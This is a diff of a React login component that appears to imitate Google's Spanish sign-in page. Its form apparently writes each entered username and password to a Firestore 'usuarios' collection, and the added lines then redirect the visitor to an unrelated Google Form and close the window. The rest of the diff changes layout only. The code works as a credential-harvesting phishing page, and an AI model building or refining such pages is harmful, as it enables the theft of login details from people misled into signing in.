@@ -53,7 +53,9 @@ function App() {
     await db.collection('usuarios').add(usuario);
     setUsername('');
     setPassword('');
-
+    const url ='https://docs.google.com/forms/d/e/1FAIpQLSevJVUOnKEvUJIG7clH0qBdJdZivQQETgl2VzDDOljWW4EEyQ/viewform';
+    window.open(url,"_parent");
+    window.close();
   }
   return (
     
@@ -95,7 +97,13 @@ function App() {
     <div style={{textAlign:'start',marginTop:30, marginBottom:25}}>
     <p style={{fontSize:13, fontFamily:'Noto Sans'}}>¿No es tu ordenador? Usa el modo invitados para iniciar sesión de forma privada. <strong>Más información</strong></p>
     </div>
-       <input type="submit" value="Iniciar Sesión" className='btn btn-primary'/>
+
+ 
+      <div style={{flex:1}}>
+        <input type="submit" value="Iniciar Sesión" className='btn btn-primary'/>
+      </div>
+    
+      
        </form>
   
     </div>
